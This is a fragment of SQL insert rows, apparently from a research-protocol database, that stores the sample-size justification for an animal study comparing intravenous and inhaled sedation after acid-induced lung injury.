	(5759,129,'sample_size_calculation','\"yes\"','2022-03-31 13:23:43','2022-03-31 13:23:43'),
	(5760,129,'sample_size_calculation_details','\"According to the principles of the 3Rs (Replacement, Reduction, and Refinement), a limited number of animals will be used (six animals in each of the three groups, total N = 18)) in order to detect a mean difference of 5% per hour (SD=2.5) in net AFC rate at 4 hours after lung injury (primary endpoint) between acid-injured receiving intravenous sedation and those receiving inhaled sedation, when considering alpha and beta risks of 5% (bilateral) and 10%, respectively.\\nA statistical power of 90% will be considered sufficient to allow multiple comparisons between groups.\"','2022-03-31 13:23:43','2022-03-31 13:23:43'),
